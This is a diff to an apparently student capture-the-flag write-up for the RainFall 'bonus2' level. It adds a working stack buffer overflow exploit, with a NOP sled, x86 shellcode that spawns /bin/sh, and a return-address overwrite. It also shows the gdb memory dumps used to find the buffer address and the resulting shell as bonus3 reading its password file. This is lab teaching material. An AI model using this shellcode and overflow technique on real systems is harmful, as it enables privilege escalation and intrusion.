@@ -258,7 +258,7 @@ So to finish. All this is a Flipping memcpy optimised for ASM, hard coded for 19
 But we can't copy any kind of Hello,
 We have to take the finnish one, why ? because of the characters that we saw earlier, they are not ascii characters but UTF-8, which means that they are coded on 2 bytes insteadof one !
 Hyvää päivää -> pure length = 14.
-Hyvää päivää -> memory length = 17
+Hyvää päivää -> memory length = 18 (there is a space)
 Yes just enough to go beyoud the buffer
 Yes 30 lines just for that.
 ```
@@ -278,3 +278,47 @@ to finish we put our wonderfully awful buffer
 and here we go we push,
 strcat,
 and then we put the first buffer that could have overflow into eax and to finish we push and puts it
+
+let's now exploit.
+```
+bonus2@RainFall:~$ ./bonus2 $(python2 -c 'import sys; sys.stdout.write(b"\x90" * 11 +  b"\x31\xD2\xB8\xFF\x2F\x73\x68\xC1\xE8\x08\x50\xB8\x2F\x62\x69\x6E\x50\x89\xE3\x52\x53\x89\xE1\x31\xC0\xB0\x0B\xCD\x80")') $(python2 -c 'import sys; sys.stdout.write(b"a" * 18 + b"\x23\xf6\xff\xbf")')
+```
+How does this work ?
+So we have our nop sledge to make sure that the shell code will get executed + our shell code, which in total makes 40 characters
+then in the second one what do we have ?
+We have 18 A, which are here to smash everything until the return value is reached, and for the return value we put the adress of our buffer
+(got with gdb)
+```
+(gdb) b *0x0804862b
+(gdb) start "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
+(gdb) c
+(gdb) x/20wx $esp
+0xbffff600:     0x41414141      0x41414141      0x41414141      0x41414141
+0xbffff610:     0x41414141      0x41414141      0x41414141      0x41414141
+0xbffff620:     0x41414141      0x41414141      0x41414141      0x41414141
+0xbffff630:     0x41414141      0x41414141      0x41414141      0x41414141
+0xbffff640:     0x41414141      0x41414141      0x00000000      0xb7e5ec73
+```
+And the place where the 41 starts are the buffer, the only thing that changes is that gdb adds more environment Variables so we have to change the adress 
+a little, lucky for you it changes of 32
+so: 0xbffff600 -> 0xbffff603 (to be on the nop sledge for sure)
+0xbffff623 -> the offset because of gdb
+```
+bonus2@RainFall:~$ ./bonus2 $(python2 -c 'import sys; sys.stdout.write(b"\x90" * 11 +  b"\x31\xD2\xB8\xFF\x2F\x73\x68\xC1\xE8\x08\x50\xB8\x2F\x62\x69\x6E\x50\x89\xE3\x52\x53\x89\xE1\x31\xC0\xB0\x0B\xCD\x80")') $(python2 -c 'import sys; sys.stdout.write(b"a" * 18 + b"\x23\xf6\xff\xbf")')
+Hyvää päivää �S�
+                aaaaaaaaaaaaaaaaaa#
+$ whoami
+bonus3
+$ cd ../bonus3
+$ ls -la
+total 17
+dr-xr-x---+ 1 bonus3 bonus3   80 Mar  6  2016 .
+dr-x--x--x  1 root   root    340 Sep 23  2015 ..
+-rw-r--r--  1 bonus3 bonus3  220 Apr  3  2012 .bash_logout
+-rw-r--r--  1 bonus3 bonus3 3530 Sep 23  2015 .bashrc
+-rw-r--r--+ 1 bonus3 bonus3   65 Sep 23  2015 .pass
+-rw-r--r--  1 bonus3 bonus3  675 Apr  3  2012 .profile
+-rwsr-s---+ 1 end    users  5595 Mar  6  2016 bonus3
+$ cat .pass
+<hidden>
+```
